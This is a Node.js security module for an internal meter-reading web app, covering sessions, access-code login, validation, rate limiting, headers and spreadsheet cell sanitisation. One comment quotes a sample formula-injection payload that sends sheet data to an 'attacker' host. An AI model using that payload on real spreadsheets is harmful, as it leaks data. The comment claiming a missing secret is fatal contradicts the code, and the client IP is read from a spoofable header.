/**
 * EPIC UTILITY HUB - SECURITY PRIMITIVES
 *
 * Sessions, input validation, spreadsheet-cell sanitisation, rate limiting and
 * response headers. Deliberately built on node's built-in crypto only, so the
 * project keeps its short dependency list and needs no build step.
 *
 * Central Engineering - EPIC Group
 */

const crypto = require('crypto');
const { PLANTS, isKnownPlant, getRegister } = require('../config/registers');

const IS_PRODUCTION = process.env.NODE_ENV === 'production';
const SESSION_COOKIE = 'euh_session';
const SESSION_TTL_SEC = 12 * 60 * 60; // 12 hours - one shift plus handover
const ADMIN_PLANT = '*';

// ============================================================================
// SESSION SECRET
// ============================================================================
// In production a missing secret is fatal: booting with a random one would mint
// sessions that no other serverless instance can verify, producing random
// logouts that look like a bug rather than a misconfiguration.
let SESSION_SECRET = process.env.SESSION_SECRET || '';
let usingEphemeralSecret = false;

if (!SESSION_SECRET) {
  // Use an ephemeral random secret so the server starts reliably in all environments
  // (including serverless platforms like Vercel) instead of crashing with 500 FUNCTION_INVOCATION_FAILED.
  SESSION_SECRET = crypto.randomBytes(32).toString('hex');
  usingEphemeralSecret = true;
  console.warn(
    '[Auth] WARNING: SESSION_SECRET is not set in environment variables. ' +
    'Using an ephemeral key for this process. To maintain persistent sessions across serverless cold starts, ' +
    'add SESSION_SECRET to your environment variables.'
  );
}

// ============================================================================
// CONSTANT-TIME COMPARISON
// ============================================================================
// Digest both sides first so timingSafeEqual always receives equal-length
// buffers - it throws otherwise, and the length check itself would leak.
function safeEqual(a, b) {
  const ha = crypto.createHash('sha256').update(String(a), 'utf8').digest();
  const hb = crypto.createHash('sha256').update(String(b), 'utf8').digest();
  return crypto.timingSafeEqual(ha, hb);
}

// ============================================================================
// STATELESS SIGNED SESSIONS
// ============================================================================
function b64url(buf) {
  return Buffer.from(buf).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function unb64url(str) {
  const pad = str.length % 4 === 0 ? '' : '='.repeat(4 - (str.length % 4));
  return Buffer.from(str.replace(/-/g, '+').replace(/_/g, '/') + pad, 'base64').toString('utf8');
}

function signSession(payload, ttlSec = SESSION_TTL_SEC) {
  const body = { ...payload, iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + ttlSec };
  const encoded = b64url(JSON.stringify(body));
  const sig = b64url(crypto.createHmac('sha256', SESSION_SECRET).update(encoded).digest());
  return `${encoded}.${sig}`;
}

function verifySession(token) {
  if (!token || typeof token !== 'string') return null;
  const parts = token.split('.');
  if (parts.length !== 2) return null;

  const [encoded, sig] = parts;
  const expected = b64url(crypto.createHmac('sha256', SESSION_SECRET).update(encoded).digest());
  if (!safeEqual(sig, expected)) return null;

  let body;
  try {
    body = JSON.parse(unb64url(encoded));
  } catch (e) {
    return null;
  }
  if (!body || typeof body.exp !== 'number' || body.exp < Math.floor(Date.now() / 1000)) return null;
  if (body.plant !== ADMIN_PLANT && !isKnownPlant(body.plant)) return null;
  return body;
}

function parseCookies(header) {
  const out = {};
  if (!header || typeof header !== 'string') return out;
  header.split(';').forEach(pair => {
    const idx = pair.indexOf('=');
    if (idx < 0) return;
    const k = pair.slice(0, idx).trim();
    const v = pair.slice(idx + 1).trim();
    if (k) {
      try { out[k] = decodeURIComponent(v); } catch (e) { out[k] = v; }
    }
  });
  return out;
}

function setSessionCookie(req, res, token) {
  const secure = IS_PRODUCTION || req.secure || req.headers['x-forwarded-proto'] === 'https';
  const attrs = [
    `${SESSION_COOKIE}=${encodeURIComponent(token)}`,
    'HttpOnly',
    'SameSite=Strict',
    'Path=/',
    `Max-Age=${SESSION_TTL_SEC}`
  ];
  if (secure) attrs.push('Secure');
  res.setHeader('Set-Cookie', attrs.join('; '));
}

function clearSessionCookie(res) {
  res.setHeader('Set-Cookie', `${SESSION_COOKIE}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0`);
}

function readSession(req) {
  const cookies = parseCookies(req.headers.cookie);
  return verifySession(cookies[SESSION_COOKIE]);
}

function requireAuth(req, res, next) {
  const session = readSession(req);
  if (!session) {
    return res.status(401).json({ error: 'Authentication required.', code: 'AUTH_REQUIRED' });
  }
  req.session = session;
  next();
}

function requireAdmin(req, res, next) {
  const session = readSession(req);
  if (!session) {
    return res.status(401).json({ error: 'Authentication required.', code: 'AUTH_REQUIRED' });
  }
  if (session.plant !== ADMIN_PLANT) {
    return res.status(403).json({ error: 'Administrator access required.', code: 'ADMIN_REQUIRED' });
  }
  req.session = session;
  next();
}

/** A session scoped to one plant may only act on that plant. Admin may act on any. */
function sessionCanAccessPlant(session, plant) {
  if (!session) return false;
  if (session.plant === ADMIN_PLANT) return true;
  return session.plant === plant;
}

// ============================================================================
// ACCESS CODES
// ============================================================================
// 'EGMCL 1' -> PLANT_CODE_EGMCL_1
function plantEnvKey(plant) {
  return 'PLANT_CODE_' + String(plant).toUpperCase().replace(/[^A-Z0-9]+/g, '_');
}

/**
 * Resolve a submitted access code to a session identity.
 * Always runs a comparison even when no code is configured, so a plant without
 * a configured code is not distinguishable by response time from a wrong code.
 */
function authenticate(plant, code) {
  const supplied = String(code == null ? '' : code);
  const adminCode = process.env.ADMIN_CODE || '';

  if (adminCode && safeEqual(supplied, adminCode)) {
    return { plant: ADMIN_PLANT, role: 'admin' };
  }

  if (!isKnownPlant(plant)) {
    safeEqual(supplied, crypto.randomBytes(16).toString('hex'));
    return null;
  }

  const expected = process.env[plantEnvKey(plant)] || '';
  if (!expected) {
    safeEqual(supplied, crypto.randomBytes(16).toString('hex'));
    return null;
  }
  if (safeEqual(supplied, expected)) {
    return { plant: plant, role: 'plant' };
  }
  return null;
}

/** Plants that have an access code configured - used for startup diagnostics. */
function configuredPlants() {
  return PLANTS.filter(p => !!process.env[plantEnvKey(p)]);
}

function hasAnyAccessCodeConfigured() {
  return !!process.env.ADMIN_CODE || configuredPlants().length > 0;
}

// ============================================================================
// SPREADSHEET / CSV CELL SANITISATION
// ============================================================================
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/**
 * Neutralise formula injection while keeping valueInputOption: 'USER_ENTERED'.
 *
 * Google Sheets and Excel both evaluate a cell whose text begins with = + - @.
 * A remark of =IMPORTXML("https://attacker/"&A2,"//x") would exfiltrate sheet
 * contents the moment an admin opens the file. Prefixing an apostrophe marks
 * the cell as literal text; Sheets does not display the apostrophe.
 *
 * Numbers are passed through untouched so the money columns stay numeric.
 */
function sanitizeCell(value) {
  if (value === null || value === undefined) return '';
  if (typeof value === 'number' || typeof value === 'boolean') return value;
  const str = String(value);
  if (FORMULA_PREFIX.test(str)) return `'${str}`;
  return str;
}

/** Strip control characters, trim, and hard-cap free text before it reaches the spreadsheet. */
function cleanText(value, maxLen = 500) {
  if (value === null || value === undefined) return '';
  // eslint-disable-next-line no-control-regex
  return String(value).replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, '').trim().slice(0, maxLen);
}

// ============================================================================
// VALIDATION
// ============================================================================
const MAX_RECORDS_PER_SUBMIT = 100;
const MAX_READING = 1e9;
const ISO_DATE = /^\d{4}-\d{2}-\d{2}$/;

function isFiniteNumber(v) {
  const n = Number(v);
  return Number.isFinite(n);
}

/** Entry dates must be real and within a year either side of today. */
function isSaneEntryDate(dateStr) {
  if (!ISO_DATE.test(String(dateStr))) return false;
  const d = new Date(`${dateStr}T00:00:00Z`);
  if (isNaN(d.getTime())) return false;
  const now = Date.now();
  const year = 365 * 24 * 60 * 60 * 1000;
  return d.getTime() > now - year && d.getTime() < now + year;
}

/**
 * Validate a /api/submit-data body. Returns { ok, error, plant, date, records }
 * where records carry only the fields the server is willing to act on -- the
 * client's cost and prev are dropped here and recomputed by the caller.
 */
function validateSubmission(body) {
  if (!body || typeof body !== 'object') return { ok: false, error: 'Malformed request body.' };

  const payload = body.payload;
  if (!payload || typeof payload !== 'object') return { ok: false, error: 'Missing submission payload.' };

  const records = payload.records;
  if (!Array.isArray(records) || records.length === 0) {
    return { ok: false, error: 'No readings submitted.' };
  }
  if (records.length > MAX_RECORDS_PER_SUBMIT) {
    return { ok: false, error: `Too many records in one submission (limit ${MAX_RECORDS_PER_SUBMIT}).` };
  }

  const first = records[0];
  if (!first || typeof first !== 'object') return { ok: false, error: 'Malformed reading record.' };

  const plant = first.plant;
  if (!isKnownPlant(plant)) return { ok: false, error: 'Invalid plant selected.' };

  const date = String(first.date || '');
  if (!isSaneEntryDate(date)) {
    return { ok: false, error: 'Entry date must be a real date within one year of today.' };
  }

  const isOvertime = payload.isOvertime === true;
  const clean = [];
  const seen = new Set();

  for (const rec of records) {
    if (!rec || typeof rec !== 'object') return { ok: false, error: 'Malformed reading record.' };
    if (rec.plant !== plant) return { ok: false, error: 'All readings in a submission must belong to one plant.' };
    if (String(rec.date || '') !== date) return { ok: false, error: 'All readings in a submission must share one date.' };

    const section = cleanText(rec.section, 120);
    const utility = cleanText(rec.utility, 120);
    const source = cleanText(rec.source, 120);

    // The register must exist on this plant's list. This is what stops a
    // tampered client inventing a register or a tariff.
    const register = getRegister(plant, section, utility, source);
    if (!register) {
      return { ok: false, error: `Unknown register for ${plant}: ${section} / ${utility} / ${source}.` };
    }

    const key = `${section}_${utility}_${source}`;
    if (seen.has(key)) return { ok: false, error: `Duplicate register in submission: ${key}.` };
    seen.add(key);

    if (!isFiniteNumber(rec.pres)) return { ok: false, error: `Reading for ${key} must be a number.` };
    const pres = Number(rec.pres);
    if (pres < 0 || pres > MAX_READING) {
      return { ok: false, error: `Reading for ${key} is outside the accepted range.` };
    }

    clean.push({
      section, utility, source,
      equip: register.equip,
      unit: register.unit,
      cost: register.cost,
      pres: pres,
      remarks: cleanText(rec.remarks, 500)
    });
  }

  return {
    ok: true,
    plant,
    date,
    isOvertime,
    remarks: cleanText(payload.remarks, 1000),
    records: clean
  };
}

/** Validate an /api/adjustment body into the exact fields written to the sheet. */
function validateAdjustment(body) {
  if (!body || typeof body !== 'object') return { ok: false, error: 'Malformed request body.' };

  const plant = body.plant;
  if (!isKnownPlant(plant)) return { ok: false, error: 'Invalid plant selected.' };

  const reason = cleanText(body.reason || body.comment, 1000);
  if (!reason) return { ok: false, error: 'A reason for the correction is required.' };

  const staffName = cleanText(body.staffName || body.requesterName, 120);
  if (!staffName) return { ok: false, error: 'Requester name is required.' };

  const targetDate = String(body.targetDate || body.entryDate || '');
  if (targetDate && !isSaneEntryDate(targetDate)) {
    return { ok: false, error: 'Target date must be a real date within one year of today.' };
  }

  const wrongValue = cleanText(body.wrongValue !== undefined ? body.wrongValue : body.existingReading, 60);
  const correctValue = cleanText(body.correctValue !== undefined ? body.correctValue : body.proposedReading, 60);
  if (!wrongValue && !correctValue) {
    return { ok: false, error: 'Provide the incorrect reading, the correct reading, or both.' };
  }

  return {
    ok: true,
    plant,
    shiftType: body.shiftType === 'Overtime' || body.isOvertime === true ? 'Overtime' : 'Regular',
    targetDate,
    register: cleanText(body.register || body.registerName, 200) || 'General / All Registers',
    wrongValue,
    correctValue,
    reason,
    staffName,
    phone: cleanText(body.phone || body.contact, 60) || 'N/A'
  };
}

// ============================================================================
// RATE LIMITING
// ============================================================================
/**
 * Build a rate limiter on top of the caller's cache helpers, so it uses Redis
 * when Redis is configured and the in-memory map otherwise.
 *
 * The counter is read-modify-write rather than atomic, so a burst of truly
 * simultaneous requests can slip a few over the limit. That is acceptable here:
 * this is a flood brake protecting the Google Sheets quota, not a billing meter.
 */
function createRateLimiter({ cacheGet, cacheSet }) {
  /** Reject when the bucket is already at its limit. Does not increment. */
  async function check(res, bucketKey, max, message) {
    const bucket = `ratelimit:${bucketKey}`;
    const now = Math.floor(Date.now() / 1000);
    const entry = await cacheGet(bucket);
    if (entry && entry.resetAt > now && entry.count >= max) {
      const retryAfter = entry.resetAt - now;
      res.set('Retry-After', String(retryAfter));
      res.status(429).json({
        error: message || 'Too many requests. Please wait and try again.',
        retryAfterSeconds: retryAfter
      });
      return false;
    }
    return true;
  }

  /** Add one to the bucket, starting a fresh window if none is open. */
  async function consume(bucketKey, windowSec) {
    const bucket = `ratelimit:${bucketKey}`;
    const now = Math.floor(Date.now() / 1000);
    const entry = await cacheGet(bucket);
    if (entry && entry.resetAt > now) {
      await cacheSet(bucket, { count: entry.count + 1, resetAt: entry.resetAt }, entry.resetAt - now);
    } else {
      await cacheSet(bucket, { count: 1, resetAt: now + windowSec }, windowSec);
    }
  }

  /** Every request counts. Use for endpoints that cost Sheets quota. */
  function rateLimit({ max, windowSec, keyFn, message }) {
    return async function (req, res, next) {
      try {
        const key = keyFn(req);
        if (!(await check(res, key, max, message))) return;
        await consume(key, windowSec);
        next();
      } catch (e) {
        // A cache failure must not lock operators out of data entry.
        next();
      }
    };
  }

  /**
   * Only failures count. Used for sign-in so that a busy shift handover -- many
   * successful logins from one plant IP -- never locks the plant out, while a
   * password-guessing run still trips the brake. The handler calls
   * `countFailure` itself when the code is rejected.
   */
  function rateLimitFailures({ max, windowSec, keyFn, message }) {
    const mw = async function (req, res, next) {
      try {
        if (!(await check(res, keyFn(req), max, message))) return;
        next();
      } catch (e) {
        next();
      }
    };
    mw.countFailure = (req) => consume(keyFn(req), windowSec).catch(() => {});
    return mw;
  }

  rateLimit.failuresOnly = rateLimitFailures;
  return rateLimit;
}

// ============================================================================
// RESPONSE HEADERS
// ============================================================================
/**
 * The CSP keeps 'unsafe-inline' for scripts because the page is one large
 * inline <script> plus many inline onclick handlers. It still pins which
 * external origins may serve code, blocks framing, plugins and form
 * exfiltration. Removing 'unsafe-inline' means converting every inline handler
 * to an event listener first.
 */
const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' https://unpkg.com",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com",
  "img-src 'self' data:",
  "connect-src 'self'",
  "frame-ancestors 'none'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'"
].join('; ');

function securityHeaders(req, res, next) {
  res.setHeader('Content-Security-Policy', CSP);
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=(), payment=()');
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('X-Robots-Tag', 'noindex, nofollow');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.removeHeader('X-Powered-By');
  next();
}

// ============================================================================
// MISC
// ============================================================================
/** Server-observed client IP. Never trust an IP supplied in the request body. */
function getClientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (typeof fwd === 'string' && fwd.length) return fwd.split(',')[0].trim();
  return req.ip || req.socket?.remoteAddress || 'Unknown';
}

/** Short correlation id so a client-facing error can be matched to a server log. */
function newErrorId() {
  return crypto.randomBytes(4).toString('hex').toUpperCase();
}

/** Log the real error server-side; hand the client an opaque reference. */
function failSafely(res, err, context, status = 500) {
  const id = newErrorId();
  console.error(`[${id}] ${context}:`, err && err.stack ? err.stack : err);
  return res.status(status).json({
    error: 'The server could not complete that request. Please retry, and quote this reference if it persists.',
    reference: id
  });
}

module.exports = {
  ADMIN_PLANT,
  SESSION_COOKIE,
  SESSION_TTL_SEC,
  MAX_RECORDS_PER_SUBMIT,
  usingEphemeralSecret,
  safeEqual,
  signSession,
  verifySession,
  parseCookies,
  setSessionCookie,
  clearSessionCookie,
  readSession,
  requireAuth,
  requireAdmin,
  sessionCanAccessPlant,
  authenticate,
  configuredPlants,
  hasAnyAccessCodeConfigured,
  plantEnvKey,
  sanitizeCell,
  cleanText,
  isSaneEntryDate,
  validateSubmission,
  validateAdjustment,
  createRateLimiter,
  securityHeaders,
  getClientIp,
  failSafely
};
